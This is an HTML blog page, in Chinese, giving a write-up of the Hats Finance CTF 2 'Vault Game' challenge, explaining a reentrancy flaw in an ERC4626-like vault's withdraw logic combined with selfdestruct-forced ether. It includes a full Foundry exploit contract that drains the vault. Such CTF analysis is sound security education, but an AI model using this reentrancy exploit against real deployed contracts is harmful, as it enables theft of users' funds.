@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Intro 前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。
+Vault Game Repo
+Vault.sol 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。
+The Challenge 最初會deposit 1 ether 到 vault 中。
+1 2 3 4 constructor() payable ERC20(“Vault Challenge Token”, “VCT”) { require(msg.value == 1 ether, “Must init the contract with 1 eth”); _deposit(msg.sender, address(this), msg.value); } 通關目標為清空 valut 的 balance:
+1 2 3 4 function captureTheFlag(address newFlagHolder) external { require(address(this).balance == 0, “Balance is not 0”); flagHolder = newFlagHolder; } Observation 先觀察一一下能轉出 ether 的地方，ERC4626ETH.'><title>Hats Finance CTF 2 WriteUp</title>
+
+<link rel='canonical' href='https://ashirleyshe.github.io/p/hats-finance-ctf-2-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Hats Finance CTF 2 WriteUp'>
+<meta property='og:description' content='Intro 前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。
+Vault Game Repo
+Vault.sol 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。
+The Challenge 最初會deposit 1 ether 到 vault 中。
+1 2 3 4 constructor() payable ERC20(“Vault Challenge Token”, “VCT”) { require(msg.value == 1 ether, “Must init the contract with 1 eth”); _deposit(msg.sender, address(this), msg.value); } 通關目標為清空 valut 的 balance:
+1 2 3 4 function captureTheFlag(address newFlagHolder) external { require(address(this).balance == 0, “Balance is not 0”); flagHolder = newFlagHolder; } Observation 先觀察一一下能轉出 ether 的地方，ERC4626ETH.'>
+<meta property='og:url' content='https://ashirleyshe.github.io/p/hats-finance-ctf-2-writeup/'>
+<meta property='og:site_name' content='A'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2022-10-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-10-12T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Hats Finance CTF 2 WriteUp">
+<meta name="twitter:description" content="Intro 前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。
+Vault Game Repo
+Vault.sol 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。
+The Challenge 最初會deposit 1 ether 到 vault 中。
+1 2 3 4 constructor() payable ERC20(“Vault Challenge Token”, “VCT”) { require(msg.value == 1 ether, “Must init the contract with 1 eth”); _deposit(msg.sender, address(this), msg.value); } 通關目標為清空 valut 的 balance:
+1 2 3 4 function captureTheFlag(address newFlagHolder) external { require(address(this).balance == 0, “Balance is not 0”); flagHolder = newFlagHolder; } Observation 先觀察一一下能轉出 ether 的地方，ERC4626ETH.">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/wanhsin_hu366a5cf9d6ed6a7819b52901816f26e5_1994279_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🐱</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">A</a></h1>
+            <h2 class="site-description">Fat Cat</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://ashirleyshe.github.io/" selected>English</option>
+                        
+                            <option value="https://ashirleyshe.github.io/zh-tw/" >繁體中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/solidity/" >
+                Solidity
+            </a>
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hats-finance-ctf-2-writeup/">Hats Finance CTF 2 WriteUp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 12, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="intro">Intro</h2>
+<p>前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。</p>
+<p><a class="link" href="https://github.com/hats-finance/vault-game/tree/16a86ab35603fe79382a124b88f8ef3273b5316b"  target="_blank" rel="noopener"
+    >Vault Game Repo</a></p>
+<p><code>Vault.sol</code> 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。</p>
+<h2 id="the-challenge">The Challenge</h2>
+<p>最初會deposit 1 ether 到 vault 中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="n">ERC20</span><span class="p">(</span><span class="err">“</span><span class="n">Vault</span> <span class="n">Challenge</span> <span class="n">Token</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">VCT</span><span class="err">”</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="err">“</span><span class="n">Must</span> <span class="n">init</span> <span class="n">the</span> <span class="kd">contract</span> <span class="nc">with</span> <span class="mi">1</span> <span class="n">eth</span><span class="err">”</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_deposit</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通關目標為清空 valut 的 balance:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">captureTheFlag</span><span class="p">(</span><span class="kt">address</span> <span class="n">newFlagHolder</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="err">“</span><span class="n">Balance</span> <span class="k">is</span> <span class="n">not</span> <span class="mi">0</span><span class="err">”</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flagHolder</span> <span class="o">=</span> <span class="n">newFlagHolder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="observation">Observation</h2>
+<p>先觀察一一下能轉出 ether 的地方，<code>ERC4626ETH.sol</code> 的 <code>_withdraw()</code>(line 148):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="n">excessETH</span> <span class="o">=</span> <span class="n">totalAssets</span><span class="p">()</span> <span class="o">-</span> <span class="n">totalSupply</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">_burn</span><span class="p">(</span><span class="n">_owner</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Address</span><span class="p">.</span><span class="n">sendValue</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">excessETH</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Address</span><span class="p">.</span><span class="n">sendValue</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">()),</span> <span class="n">excessETH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>withdraw()</code> 跟 <code>redeem()</code>都會進<code>_withdraw()</code>，而且沒有 reentrancy guard。</p>
+<p>注意到<code>_withdraw()</code>中，有兩個 sendValue，第一個傳送 amount ether 給 receiver，第二個會傳送 excessETH 給 owner。而 excessETH 的值一開始就被暫存，因此在第一次的 ether transfer 重入 <code>withdraw()</code>，設定 <code>amount = 0</code>，這樣便不會影響到 excessETH，藉此可以得到額外的 excessETH，最終清空 vault。</p>
+<p>要讓 <code>excessETH &gt; 0</code>，需增加<code>totalAssets()</code>但不能動到<code>totalSupply()</code>，可以透過 selfdestruct 強制轉移 ether 到 vault 合約中。</p>
+<h2 id="exploit">Exploit</h2>
+<ol>
+<li>建立一個合約轉入 1 ether 並調用 selfdestruct，所以此時 vault 的 excessETH = 1 ether。</li>
+<li>調用 <code>withdraw()</code>，將 amount 設為 0。</li>
+<li>重入 <code>withdraw()</code>，excessETH = 1 ether 被轉給 owner，此時 vault balance = 1 ether。</li>
+<li>回到被劫持的 <code>withdraw()</code>，excessETH = 1 ether 再次被轉給 owner，vault balance = 0。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/Vault.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Destruct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">destruct</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">target</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">VaultTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Vault</span> <span class="n">vault</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testExp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">2</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Destruct</span> <span class="n">destruct</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Destruct</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vault</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Vault</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// send unexpected ether to vault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">destruct</span><span class="p">.</span><span class="n">destruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vault</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">0</span> <span class="kc">ether</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;vault balance&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vault</span><span class="p">.</span><span class="n">captureTheFlag</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;vault.flagHolder&#34;</span><span class="p">,</span> <span class="n">vault</span><span class="p">.</span><span class="n">flagHolder</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="o">!</span><span class="n">flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">vault</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/metatrust-ctf-writeup-bytesmove/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Metatrust CTF Writeup - BytesMove</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ethernaut-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ethernaut Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/foundry-notes/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Foundry Notes</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ashley-10" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 A
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#the-challenge">The Challenge</a></li>
+    <li><a href="#observation">Observation</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
